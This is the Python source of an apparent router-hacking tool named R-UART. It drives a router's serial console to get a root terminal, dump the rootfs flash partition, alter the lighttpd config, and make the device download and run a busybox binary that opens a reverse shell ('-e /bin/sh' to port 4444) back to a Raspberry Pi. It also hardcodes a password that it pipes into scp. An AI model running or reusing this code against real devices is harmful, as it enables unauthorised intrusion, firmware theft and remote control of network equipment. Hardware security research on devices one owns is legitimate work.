import re
import sys
import serial
import requests
import netifaces as ni

from time import sleep
from shutil import copyfile
from colorama import init, Fore, Back, Style

init(autoreset=True) #Colorama autoreset


RASPBERRYPI_PASSWORD = "top_secret_password"


def read_data(ser): 
    """
        Read bytes until there is no more avaliable on the serial port
        and return the result of the read
    """
    received_data = ser.read()              
    sleep(0.1)
    
    while ser.inWaiting()>0:
        data_left = ser.inWaiting()
        received_data += ser.read(data_left)
        sleep(0.1)
    
    datos_recibidos = received_data.decode("utf-8")
    
    return datos_recibidos


def write_data(ser, command):
    """
        Write any command to the device connected through the serial port
    """
    WaitBytes = ser.write((command + "\n").encode())
    ser.read(WaitBytes) #To Avoid read the input later and its print on screen
   
    
def parse_output(output):
    """
        Parse output from read_data to delete ansi code
    """
    ansi_escape = re.compile(r'(?:\x1B[@-_]|[\x80-\x9F])[0-?]*[ -/]*[@-~]')
    result = ansi_escape.sub('', output).replace("\r", "")
    
    final_output = ""
    for line in result.split("\n"):
        if line == "" or line == "[root@OpenWrt]" or line == "/ # ":
            pass
        else:
            final_output += line + "\n"
            
    return final_output
            
    
            

def send_command(ser, command):
    """
        Send any command and get the result
    """
    write_data(ser, command)
    return parse_output(read_data(ser))



def find_baudrate():
    """
        For autofinding the correct baudrate of the device (reads the terminal ports until there are valid ascii code on it)
    """
    
    print(Fore.CYAN + "+------------------------+")
    print(Fore.CYAN + "|    AUTOFIND BAUDRATE   |")
    print(Fore.CYAN + "+------------------------+")

    
    test_serial = serial.Serial("/dev/ttyS0")
    
    baudrates = [1200, 1800, 2400, 4800, 9600, 38400, 19200, 57600, 115200]
    final_baudrate = 0
    
    valid_baudrates = 0
    for baud in baudrates:
        
        try:
            print(Fore.YELLOW + "Testing " + str(baud) + "->", end = " ")
            test_serial.baudrate = baud
            read_data(test_serial)
            
            final_baudrate = baud
            print(Fore.GREEN + "OK")
            valid_baudrates += 1
            
        except Exception as e: 
            print(Fore.RED + "Not valid")
            
            
    if final_baudrate != 0:
        
        if valid_baudrates != 1: 
            print("\n\n" + Back.RED + "Found multiple valid baudrates, possible error but It will try with the last baudrate found (usually it is the correct one)")
        
        print(Fore.GREEN + "\n\nBaudrate to work with: " + str(final_baudrate))
        
    else:
        
        final_baudrate = 0
 
 
    return final_baudrate


def get_terminal(ser):
    """
        Gives the user access to the device terminal
    """
    command = ""
    
    while command != "exit from terminal":
        command = input(">> ")
        print(send_command(ser, command), end = "")
        
        
def check_if_terminal(ser):
    """
        Check if a terminal responds 
    """
    print("\n● " + Fore.YELLOW + "Baudrate: " + Fore.WHITE + str(ser.baudrate))
    print("● Checking if there is terminal access:", end = "")
    response = send_command(ser, "echo hola")
    
    if "hola" in response:
        print(Fore.GREEN + " ------> Got terminal ✓\n")
        return True
    
    else:
        print(Fore.RED + " ------> No terminal X")
        return False



def title():
    print(Fore.MAGENTA + """                                                                       
8888888b.        888     888       d8888 8888888b. 88888888888 
888   Y88b       888     888      d88888 888   Y88b    888     
888    888       888     888     d88P888 888    888    888     
888   d88P       888     888    d88P 888 888   d88P    888     
8888888P"        888     888   d88P  888 8888888P"     888     
888 T88b  888888 888     888  d88P   888 888 T88b      888     
888  T88b        Y88b. .d88P d8888888888 888  T88b     888     
888   T88b        "Y88888P" d88P     888 888   T88b    888     
    """)
    
    print(Fore.MAGENTA + "\t\t//////// Router UART Hacking by Carliquiss ////////\n\n")


def ducks():
    print(Fore.CYAN + "\n\nBye bye...")
    print(Fore.CYAN +
        """
          _      _      _
        <(.)__ <(.)__ <(.)__
         (___/  (___/  (___/..........
        """)


def find_user(ser):
    user_info = send_command(ser, "id")
    
    if "found" in user_info.split():
        user_info = send_command(ser, "echo $USER")

    
    return user_info.split("\n")[0]



def print_info(info):
    
    for item in info:
        try: 
            print(Fore.YELLOW + item + ": " + Fore.WHITE + info[item])
            
        except:
            pass



def check_services(ser):
    """
        Check if differents services as ssh exist on the device
    """
    print()
    print(Fore.CYAN + "+------------------------+")
    print(Fore.CYAN + "|    CHECKING SERVICES   |")
    print(Fore.CYAN + "+------------------------+")
    
    services_info = {}
    usr_bin = send_command(ser, "ls /usr/bin/")
    
    if "ssh" in usr_bin.split():
        
        print(Fore.GREEN + "-----> SSH FOUND ✓")
        services_info["ssh"] = True
    
    else:
        print(Fore.RED + "-----> NO SSH FOUND X")
        services_info["ssh"] = False


    if "scp" in usr_bin.split():
        
        print(Fore.GREEN + "-----> SCP FOUND ✓")
        services_info["scp"] = True
    
    else:
        print(Fore.RED + "-----> NO SCP FOUND X")
        services_info["scp"] = False
        

    netcat_info = send_command(ser, "nc")
    
    if "usage:" in netcat_info.split():
        
        print(Fore.GREEN + "-----> NETCAT FOUND ✓")
        services_info["netcat"] = True
    
    else:
        print(Fore.RED + "-----> NO NETCAT FOUND X")
        services_info["netcat"] = False
        
        
    wget_info = send_command(ser, "wget")
    print(wget_info.split())
    if "Usage:" in wget_info.split():
        
        print(Fore.GREEN + "-----> WGET FOUND ✓")
        services_info["wget"] = True
    
    else:
        print(Fore.RED + "-----> NO WGET FOUND X")
        services_info["wget"] = False
        
        
    
    lighttpd_info = send_command(ser, "ls /etc/lighttpd/lighttpd2.conf")
    
    if "/etc/lighttpd/lighttpd2.conf" in lighttpd_info.split("\n"):
        
        print(Fore.GREEN + "-----> LIGHTTPD FOUND ✓")
        services_info["lighttpd"] = True
    
    else:
        print(Fore.RED + "-----> NO LIGHTTPD FOUND X")
        services_info["lighttpd"] = False
        
    
    return services_info
        


def get_info(ser):
    """
        Execute differents commands to get general info about the device
    """
    
    print() 
    print(Fore.CYAN + "+------------------------+")
    print(Fore.CYAN + "|  CHECKING DEVICE INFO  |")
    print(Fore.CYAN + "+------------------------+")
    
    device_info = {}
    
    device_info["system"]     = send_command(ser, "uname -a").split("\n")[0]
    device_info["user"]       = find_user(ser)
    device_info["partitions"] = send_command(ser, "cat /proc/mtd")
    device_info["busybox"]    = send_command(ser, "busybox")    
    
    return device_info
    


def extract_rootfs(ser):
    
    print("\n● Extracting rootfs partition to /tmp/rootfs.bin.... ", end = "")
    
    try:    
        if "/tmp/rootfs.bin" in send_command(ser, "ls /tmp/rootfs.bin").split("\n"):
            print(Fore.GREEN + "Already extracted ✓\n")
        
        else:
            partitions_info = send_command(ser, "cat /proc/mtd").split("\n")    
            
            for partition in partitions_info: 
                partition = partition.split()
                
                if len(partition) == 4:
                    
                    dev = partition[0].replace(":","")
                    name = partition[3].replace('"',"")
                    
                    if name == "rootfs":
                        partition_block = "mtdblock" + dev[-1]
                        send_command(ser, "dd if=/dev/" + partition_block + " of=/tmp/" + name + ".bin bs=4096")
                        print(Fore.GREEN + "Extraction completed ✓\n")
    
    except Exception as error:
        print(Fore.RED + " ------> Error during process X:\n" + error)
            


def mod_lighttpd(ser):
    """
        If lighttpd is installed in the system, this method change the settings to mount /tmp folder in order to read/write easily on the device
    """
    
    line_to_mod = send_command(ser, "cat /etc/lighttpd/lighttpd2.conf | grep server.upload-dirs").split("\n")[0]
    send_command(ser, "cp /etc/lighttpd/lighttpd2.conf /etc/lighttpd/lighttpd2.conf.old")
    send_command(ser, """sed 's#{}#server.upload-dirs          = ( "/tmp" )#' /etc/lighttpd/lighttpd2.conf > /etc/lighttpd/modded_lighttd2.conf""".format(line_to_mod))
    send_command(ser, "cp /etc/lighttpd/modded_lighttd2.conf /etc/lighttpd/lighttpd2.conf")
        
    line_to_check = send_command(ser, "cat /etc/lighttpd/lighttpd2.conf | grep server.upload-dirs").split("\n")[0]
    
    if line_to_check == """server.upload-dirs          = ( "/tmp" )""":
        print(Fore.CYAN + "Lighttp modded to mount /tmp")
        
    else:
        print(Fore.RED + "Some errors during the process of trying to mount /tmp")
            

def copy_busybox(ser):
    
    network_status, rpi_ip = check_networking(ser)
    try:
        copyfile("./binaries/busybox-mipsel", "/var/www/html/busybox_mipsel")
        
        if check_web_server() and network_status:
            
            send_command(ser, "wget -O /tmp/busybox_el http://{}/busybox_mipsel".format(rpi_ip))
            send_command(ser, "chmod +x /tmp/busybox_el")
            send_command(ser, "/tmp/busybox_el {} 4444 -e /bin/sh &".format(rpi_ip))
            
    except Exception as error:
        print(Fore.RED + "Error pushing busybox file, error -> ")
        print(error)


def check_networking(ser):
    
    raspberry_ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
    device_ip = send_command(ser, 'ifconfig | grep "inet"').split()[1].replace("addr:", "")    
    
    print()
    print("\n● Checking connectivity:")
    print("+--------------------------------+")
    print("+  " + Fore.YELLOW + "Raspberry IP: " + Fore.WHITE + raspberry_ip + "  +")
    print("+  " + Fore.YELLOW + "Device    IP: " + Fore.WHITE + device_ip + "  +")
    print("+--------------------------------+")
    
    if raspberry_ip.rsplit(".")[0] == device_ip.rsplit(".")[0]:
        print(Fore.GREEN + " ------> Raspberry and Device on the same network ✓\n")
        return True, raspberry_ip
    
    else:
        print(Fore.RED + "▬ The device and the Raspberry Pi are not in the same network, please connect the Rasperry to the router")
        return False, raspberry_ip


def scp_to_raspi(ser):
    
    same_network, raspberry_ip = check_networking(ser)
    
    if same_network:
        print("\n● Copying rootfs.bin to raspberry /home/pi/rootfs.bin, it can take a while (up to 3-4 min). Please wait...")
        
        send_command(ser, "scp /tmp/rootfs.bin pi@{}:/home/pi/rootfs.bin".format(raspberry_ip))
        send_command(ser, "y")
        send_command(ser, RASPBERRYPI_PASSWORD + "\n")
    


def check_web_server():
    
    print() 
    print(Fore.CYAN + "+------------------------+")
    print(Fore.CYAN + "|  CHECKING WEB SERVER   |")
    print(Fore.CYAN + "+------------------------+")
    
    try: 
        request = requests.get("http://localhost")
        
        if "Apache" in request.headers['server']:
            print(Fore.GREEN + "-----> Apache working ✓")
            return True
            
        else:
            print(Fore.RED + "-----> Apache not working X")
    
    except:
        print(Fore.RED + "-----> Apache not working X")
    
    return False


def test_mode():
        
    try:
        baudrate = 57600    
        ser = serial.Serial ("/dev/ttyS0", baudrate)
        
        if check_if_terminal(ser):
            
            print_info(get_info(ser))
            servicios = check_services(ser)
            
            extract_rootfs(ser) 
            
            if not servicios["netcat"]:
                #scp_to_raspi(ser)
                pass
        
            get_terminal(ser)
            ducks()
    
    except Exception as error:
        print(Fore.RED + "Bad argument")
        print(error)



def direct_terminal_mode():
    
    try: 
        baudrate = sys.argv[2]
        
        ser = serial.Serial ("/dev/ttyS0", baudrate)
            
        if check_if_terminal(ser):
            
            get_terminal(ser)
            ducks()
    
    except Exception as error:
        print(Fore.RED + "Some error: ", end = "")
        print(error)
    
    

def auto_mode():

    baudrate = find_baudrate()
    
    ser = serial.Serial ("/dev/ttyS0", baudrate)
        
    if baudrate != 0:         
            
            
        print("\n● Please wait 40 seconds just to be sure the device is fully booted")
        sleep(40)
            
        if check_if_terminal(ser):

            print_info(get_info(ser))
            servicios = check_services(ser)
            
            extract_rootfs(ser)
            
            if servicios["scp"]:
                #scp_to_raspi(ser)
                pass
                
            response = input("\nDo you want to open the terminal? (Y/N) ")
                
            if response.upper() == "Y":
                get_terminal(ser)                
                
            ducks()
        
    else:
        print(Fore.RED + "No valid baudrate found, quitting the program..." )



def main():
    
    title()
    if len(sys.argv) >= 2:
        
        if sys.argv[1] == "-t" or sys.argv[1] == "--terminal":
            direct_terminal_mode()
        
        if sys.argv[1] == "-d" or sys.argv[1] == "--debug":
            test_mode()
        
    else: 
        auto_mode()



if __name__ == "__main__":
    main()




    


